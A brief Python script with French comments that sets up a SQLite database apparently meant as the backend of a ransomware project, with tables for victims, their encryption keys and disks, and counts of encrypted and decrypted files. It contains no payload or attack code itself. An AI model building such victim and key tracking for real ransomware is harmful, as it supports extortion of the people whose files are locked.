import os
import sqlite3

conn = sqlite3.connect('ma_base_de_donnees.db')

# Création d'un curseur pour exécuter des commandes SQL
cur = conn.cursor()

# Commande SQL pour créer une table
create_table_victims = '''
CREATE TABLE victims (
    id_victim INTEGER,
    os VARCHAR,
    hash VARCHAR PRIMARY KEY,
    disks VARCHAR,
    key VARCHAR
);
'''

create_table_decrypted = '''
CREATE TABLE decrypted (
    id_decrypted INTEGER PRIMARY KEY,
    id_victim INTEGER,
    datetime TIMESTAMP,
    nb_files INTEGER,
    FOREIGN KEY (id_victim) REFERENCES victims (id_victim)

);
'''

create_table_states = '''
CREATE TABLE states (
    id_state INTEGER PRIMARY KEY,
    id_victim INTEGER,
    datetime TIMESTAMP,
    state VARCHAR,
    FOREIGN KEY (id_victim) REFERENCES victims (id_victim)
);
'''

create_table_encrypted = '''
CREATE TABLE encrypted (
    id_encrypted INTEGER PRIMARY KEY,
    id_victim INTEGER,
    datetime TIMESTAMP,
    nb_files INTEGER,
    FOREIGN KEY (id_victim) REFERENCES victims (id_victim)

);
'''

# Exécution de la commande SQL pour créer la table
cur.execute(create_table_victims)
cur.execute(create_table_decrypted)
cur.execute(create_table_states)
cur.execute(create_table_encrypted)



# Commit pour sauvegarder les changements
conn.commit()

# Fermeture de la connexion
conn.close()
